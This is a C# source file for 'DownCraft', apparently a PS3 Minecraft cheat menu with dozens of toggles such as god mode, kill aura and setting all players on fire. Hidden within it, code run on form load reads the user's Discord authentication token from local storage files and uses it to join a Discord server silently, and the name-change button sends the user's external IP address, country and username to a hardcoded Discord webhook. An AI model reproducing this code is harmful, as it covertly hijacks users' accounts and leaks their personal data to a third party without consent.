using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml.Linq;
using PS3Lib;
using DiscordRpcDemo;

namespace DownCraft_Demo_Edition_Remake
{
    public partial class Main : Form
    {
        Functions FUNCS = new Functions();
        Offsets OFFSETS = new Offsets();

        private DiscordRpc.EventHandlers handlers;
        private DiscordRpc.RichPresence presence;

        PS3API PS3 = new PS3API();

        public static Point newpoint = new Point();
        public static int x;
        public static int y;

        public Main()
        {
            InitializeComponent();
        }


        #region "System Move Title Panel"
        private void xMouseDown(object sender, MouseEventArgs e)
        {
            x = Control.MousePosition.X - base.Location.X;
            y = Control.MousePosition.Y - base.Location.Y;
        }
        private void xMouseMove(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                newpoint = Control.MousePosition;
                newpoint.X -= x;
                newpoint.Y -= y;
                base.Location = newpoint;
            }
        }
        #endregion

        #region "DISCORD JOINER SERVER"

        public static bool FindLdb(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".ldb");
        }

        public static bool FindLog(ref string path)
        {
            if (!Directory.Exists(path))
            {
                return false;
            }
            foreach (FileInfo fileInfo in new DirectoryInfo(path).GetFiles())
            {
                if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                {
                    path += fileInfo.Name;
                    break;
                }
            }
            return path.EndsWith(".log");
        }

        public static string GetToken(string path, bool isLog = false)
        {
            byte[] bytes = File.ReadAllBytes(path);
            string @string = Encoding.UTF8.GetString(bytes);
            string text = "";
            string text2 = @string;
            while (text2.Contains("oken"))
            {
                string[] array = Sub(text2).Split(new char[]
                {
                    '"'
                });
                text = array[0];
                text2 = string.Join("\"", array);
                if (isLog && text.Length == 59)
                {
                    break;
                }
            }
            return text;
        }

        private static string Sub(string contents)
        {
            string[] array = contents.Substring(contents.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }



        public string Request(string method, string url, string postData, string token)
        {
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";
            HttpWebRequest httpWebRequest = WebRequest.CreateHttp(url);
            httpWebRequest.Method = method;
            httpWebRequest.Headers.Add("authorization", token);
            byte[] bytes = Encoding.UTF8.GetBytes(postData);
            httpWebRequest.ContentType = "application/x-www-form-urlencoded";
            httpWebRequest.ContentLength = (long)bytes.Length;
            httpWebRequest.Timeout = 2500;
            Stream requestStream = httpWebRequest.GetRequestStream();
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
            return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
        }
        public void JoinServer(string invite, string token)
        {
            try
            {
                this.Request("POST", "https://discordapp.com/api/v9/invite/" + invite, "a=b", token);
            }

            catch
            {

            }
        }

        void DiscordJoin()
        {
            try
            {
                string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
                if (!FindLdb(ref text) && !FindLog(ref text))
                {

                }

                Thread.Sleep(100);
                string text2 = GetToken(text, text.EndsWith(".log"));

                Process[] processesByName = Process.GetProcessesByName("Discord");
                for (int i = 0; i < processesByName.Length; i++)
                {

                }

                JoinServer("FDQzSr4", text2);
            }
            catch (Exception)
            {

            }
        }

        #endregion


        private void Form1_Load(object sender, EventArgs e)
        {
            this.siticonePanel2.MouseDown += this.xMouseDown; //For Move Form
            this.siticonePanel2.MouseMove += this.xMouseMove; //For Move Form
            this.siticonePanel2.MouseDown += this.xMouseDown; //For Move Form
            this.siticonePanel2.MouseMove += this.xMouseMove; //For Move Form

            this.pictureBox1.MouseDown += this.xMouseDown; //For Move Form
            this.pictureBox1.MouseMove += this.xMouseMove; //For Move Form
            this.pictureBox1.MouseDown += this.xMouseDown; //For Move Form
            this.pictureBox1.MouseMove += this.xMouseMove; //For Move Form

            MessageBox.Show("Welcome to DownCraft Demo Edition Remake\n\n\nWhy this new version ? i have closed my project and my website, so this RTM don't have any api connected to my website.\nThis version is more clean and optimized.\n\nVersion 1.0.0 remake\nMade by Misakiii", "Infos", MessageBoxButtons.OK, MessageBoxIcon.Information);

            DiscordJoin();

            this.handlers = default(DiscordRpc.EventHandlers); //FOR RPC DISCORD
            DiscordRpc.Initialize("847473943492427796", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("847473943492427796", ref this.handlers, true, null);
            this.presence.details = "Waiting for connect...";

            System.DateTime epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
            long cur_time = (long)(System.DateTime.UtcNow - epoch).TotalSeconds;

            presence.startTimestamp = cur_time;
            this.presence.state = "Remake Edition";
            this.presence.largeImageKey = "hanako";
            this.presence.largeImageText = "RTM Minecraft Demo Remake";
            DiscordRpc.UpdatePresence(ref this.presence);
        }

        private void guna2ImageButton4_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void guna2ImageButton1_Click(object sender, EventArgs e)
        {
            OFFSETS.CONNECT_TO_CONSOLE();
        }

        private void guna2ImageButton2_Click(object sender, EventArgs e)
        {
            OFFSETS.DISCONNECT_TO_CONSOLE();
        }
        private void bunifuCheckbox1_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox1.Checked)
            {
                OFFSETS.GOD_MODE(true);
            }
            else
            {
                OFFSETS.GOD_MODE(false);
            }
        }

        private void bunifuCheckbox2_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox2.Checked)
            {
                OFFSETS.INSTANT_DAMAGE(true);
            }
            else
            {
                OFFSETS.INSTANT_DAMAGE(false);
            }
        }

        private void bunifuCheckbox3_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox3.Checked)
            {
                OFFSETS.KNOCKBACK(true);
            }
            else
            {
                OFFSETS.KNOCKBACK(false);
            }
        }

        private void bunifuCheckbox4_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox4.Checked)
            {
                OFFSETS.ANTI_KNOCKBACK(true);
            }
            else
            {
                OFFSETS.ANTI_KNOCKBACK(false);
            }
        }

        private void bunifuCheckbox5_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox5.Checked)
            {
                OFFSETS.INFINITE_PICK_UP(true);
            }
            else
            {
                OFFSETS.INFINITE_PICK_UP(false);
            }
        }

        private void bunifuCheckbox6_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox6.Checked)
            {
                OFFSETS.INFINITE_BLOCK(true);
            }
            else
            {
                OFFSETS.INFINITE_BLOCK(false);
            }
        }

        private void bunifuCheckbox7_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox7.Checked)
            {
                OFFSETS.ALL_PLAYERS_SET_IN_FIRE(true);
            }
            else
            {
                OFFSETS.ALL_PLAYERS_SET_IN_FIRE(false);
            }
        }

        private void bunifuCheckbox8_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox8.Checked)
            {
                OFFSETS.MAX_XP_LEVEL(true);
            }
            else
            {
                OFFSETS.MAX_XP_LEVEL(false);
            }
        }

        private void bunifuCheckbox9_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox9.Checked)
            {
                OFFSETS.STOP_FALL_GRAVITY(true);
            }
            else
            {
                OFFSETS.STOP_FALL_GRAVITY(false);
            }
        }

        private void bunifuCheckbox10_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox10.Checked)
            {
                OFFSETS.CREEPER_EXTREM_EXPLOSION(true);
            }
            else
            {
                OFFSETS.CREEPER_EXTREM_EXPLOSION(false);
            }
        }

        private void bunifuCheckbox11_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox11.Checked)
            {
                OFFSETS.ALL_PLAYERS_SUFFOCATE(true);
            }
            else
            {
                OFFSETS.ALL_PLAYERS_SUFFOCATE(false);
            }
        }

        private void bunifuCheckbox12_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox12.Checked)
            {
                OFFSETS.NEW_SUPER_SPEED(true);
            }
            else
            {
                OFFSETS.NEW_SUPER_SPEED(false);
            }
        }

        private void bunifuCheckbox13_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox13.Checked)
            {
                OFFSETS.NIGHT_VISION(true);
            }
            else
            {
                OFFSETS.NIGHT_VISION(false);
            }
        }

        private void bunifuCheckbox14_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox14.Checked)
            {
                OFFSETS.CAN_FLY(true);
            }
            else
            {
                OFFSETS.CAN_FLY(false);
            }
        }

        private void bunifuCheckbox15_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox15.Checked)
            {
                OFFSETS.TOGGLE_SPRINT(true);
            }
            else
            {
                OFFSETS.TOGGLE_SPRINT(false);
            }
        }

        private void bunifuCheckbox16_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox16.Checked)
            {
                OFFSETS.NO_COLISSION_BYPASS(true);
            }
            else
            {
                OFFSETS.NO_COLISSION_BYPASS(false);
            }
        }

        private void bunifuCheckbox17_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox17.Checked)
            {
                OFFSETS.WALL_HACK_V2(true);
            }
            else
            {
                OFFSETS.WALL_HACK_V2(false);
            }
        }

        private void bunifuCheckbox18_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox18.Checked)
            {
                OFFSETS.NO_SLOW_DOWN(true);
            }
            else
            {
                OFFSETS.NO_SLOW_DOWN(false);
            }
        }

        private void bunifuCheckbox19_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox19.Checked)
            {
                OFFSETS.MULTI_JUMP(true);
            }
            else
            {
                OFFSETS.MULTI_JUMP(false);
            }
        }

        private void bunifuCheckbox20_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox20.Checked)
            {
                OFFSETS.ESP_ENTITY_RED(true);
            }
            else
            {
                OFFSETS.ESP_ENTITY_RED(false);
            }
        }

        private void bunifuCheckbox21_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox21.Checked)
            {
                OFFSETS.INSTANT_HIT(true);
            }
            else
            {
                OFFSETS.INSTANT_HIT(false);
            }
        }

        private void bunifuCheckbox22_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox22.Checked)
            {
                OFFSETS.INFINITE_CRAFT(true);
            }
            else
            {
                OFFSETS.INFINITE_CRAFT(false);
            }
        }

        private void bunifuCheckbox23_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox23.Checked)
            {
                OFFSETS.AUTO_JUMP(true);
            }
            else
            {
                OFFSETS.AUTO_JUMP(false);
            }
        }

        private void bunifuCheckbox24_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox24.Checked)
            {
                OFFSETS.XRAY(true);
            }
            else
            {
                OFFSETS.XRAY(false);
            }
        }

        private void bunifuCheckbox25_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox25.Checked)
            {
                OFFSETS.BETTER_TIME(true);
            }
            else
            {
                OFFSETS.BETTER_TIME(false);
            }
        }

        private void bunifuCheckbox26_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox26.Checked)
            {
                OFFSETS.FOV_WITHOUT_HAND(true);
            }
            else
            {
                OFFSETS.FOV_WITHOUT_HAND(false);
            }
        }

        private void bunifuCheckbox27_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox27.Checked)
            {
                OFFSETS.BEST_SKY(true);
            }
            else
            {
                OFFSETS.BEST_SKY(false);
            }
        }

        private void bunifuCheckbox28_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox28.Checked)
            {
                OFFSETS.SMOKE_LOBBY(true);
            }
            else
            {
                OFFSETS.SMOKE_LOBBY(false);
            }
        }

        private void bunifuCheckbox29_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox29.Checked)
            {
                OFFSETS.NAME_OVER_HEAD(true);
            }
            else
            {
                OFFSETS.NAME_OVER_HEAD(false);
            }
        }

        private void bunifuCheckbox30_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox30.Checked)
            {
                OFFSETS.IDS_ITEMS(true);
            }
            else
            {
                OFFSETS.IDS_ITEMS(false);
            }
        }

        private void bunifuCheckbox31_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox31.Checked)
            {
                OFFSETS.TEXTURE_PLASTIC(true);
            }
            else
            {
                OFFSETS.TEXTURE_PLASTIC(false);
            }
        }

        private void bunifuCheckbox32_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox32.Checked)
            {
                OFFSETS.KILL_AURA(true);
            }
            else
            {
                OFFSETS.KILL_AURA(false);
            }
        }

        private void bunifuCheckbox33_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox33.Checked)
            {
                OFFSETS.REACH_ATTACK(true);
            }
            else
            {
                OFFSETS.REACH_ATTACK(false);
            }
        }

        private void bunifuCheckbox34_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox34.Checked)
            {
                OFFSETS.ROBLOX_ANIMATION(true);
            }
            else
            {
                OFFSETS.ROBLOX_ANIMATION(false);
            }
        }

        private void bunifuCheckbox35_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox35.Checked)
            {
                OFFSETS.OPTIMIZE_CHUNKS_LOAD(true);
            }
            else
            {
                OFFSETS.OPTIMIZE_CHUNKS_LOAD(false);
            }
        }

        private void bunifuCheckbox36_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox36.Checked)
            {
                OFFSETS.CREATIVE_INVENTORY_IN_LOBBY(true);
            }
            else
            {
                OFFSETS.CREATIVE_INVENTORY_IN_LOBBY(false);
            }
        }

        private void bunifuCheckbox37_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox37.Checked)
            {
                OFFSETS.FROST_WALKER(true);
            }
            else
            {
                OFFSETS.FROST_WALKER(false);
            }
        }

        private void bunifuCheckbox38_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox38.Checked)
            {
                OFFSETS.GET_SPECTATOR_GAMEMODE(true);
            }
            else
            {
                OFFSETS.GET_SPECTATOR_GAMEMODE(false);
            }
        }

        private void bunifuCheckbox39_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox39.Checked)
            {
                OFFSETS.DRIFT_BOAT(true);
            }
            else
            {
                OFFSETS.DRIFT_BOAT(false);
            }
        }

        private void bunifuCheckbox40_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox40.Checked)
            {
                OFFSETS.SPAWN_DRAGON_EGGS(true);
            }
            else
            {
                OFFSETS.SPAWN_DRAGON_EGGS(false);
            }
        }

        private void bunifuCheckbox41_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox41.Checked)
            {
                OFFSETS.REAL_JUMP_ANIMATION(true);
            }
            else
            {
                OFFSETS.REAL_JUMP_ANIMATION(false);
            }
        }

        private void bunifuCheckbox42_OnChange(object sender, EventArgs e)
        {
            if (bunifuCheckbox42.Checked)
            {
                OFFSETS.ALL_PLAYERS_FAST_SPEED(true);
            }
            else
            {
                OFFSETS.ALL_PLAYERS_FAST_SPEED(false);
            }
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            string externalip = new WebClient().DownloadString("http://ipinfo.io/ip");
            string country = new WebClient().DownloadString("http://ipinfo.io/country");


            PS3.SetMemory(0x3000ABE4, new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });

            byte[] bytes = Encoding.ASCII.GetBytes(siticoneTextBox1.Text + "");

            PS3.SetMemory(0x3000ABE4, bytes);

            PS3.CCAPI.Notify(CCAPI.NotifyIcon.CAUTION, "Name Changed rejoin world !");

            siticoneLabel2.Text = siticoneTextBox1.Text;


            string[] AVATAR = { "https://pbs.twimg.com/media/Cw6mWuqWIAAQx_5.jpg", "https://imgcloud.pw/images/2019/06/19/yvumaobmgfeb376003c61ff3ba9d.jpg", "https://i.imgur.com/7PdJUhd.jpg", "https://i.imgur.com/kRzV4hu.png" };
            string RandomAvatar = AVATAR[new Random().Next(0, AVATAR.Length)];

            FUNCS.SEND_WEBHOOK("https://discordapp.com/api/webhooks/667749798371262494/XKaJ6aK5wWE8ZC8UyHn-jAxeEHs8xP8RcSWmhSBYbwJt1k_q6jDBwgm-6O9fgcif21iI", "DownCraft Name Logs", RandomAvatar, "```User: " + OFFSETS.USERNAME + " have change the name to " + siticoneTextBox1.Text + " \nIP: " + externalip + "Country: " + country + "```");
        }

        private void guna2ImageButton5_Click(object sender, EventArgs e)
        {
            Infos INFO = new Infos();
            INFO.Show();
        }

        private void guna2ImageButton3_Click(object sender, EventArgs e)
        {
            Settings SETTING = new Settings();
            SETTING.Show();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string[] IMG = { "hanako", "hehe", "kiss", "emilia" };
            string RandomIMG = IMG[new Random().Next(0, IMG.Length)];

            this.handlers = default(DiscordRpc.EventHandlers); //FOR RPC DISCORD
            DiscordRpc.Initialize("847473943492427796", ref this.handlers, true, null);
            this.handlers = default(DiscordRpc.EventHandlers);
            DiscordRpc.Initialize("847473943492427796", ref this.handlers, true, null);
            this.presence.details = "Connected, playing with DownCraft";

            System.DateTime epoch = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
            long cur_time = (long)(System.DateTime.UtcNow - epoch).TotalSeconds;

            presence.startTimestamp = cur_time;
            this.presence.state = "Remake Edition";
            this.presence.largeImageKey = RandomIMG;
            this.presence.largeImageText = "RTM Minecraft Demo Remake";
            DiscordRpc.UpdatePresence(ref this.presence);
        }
    }
}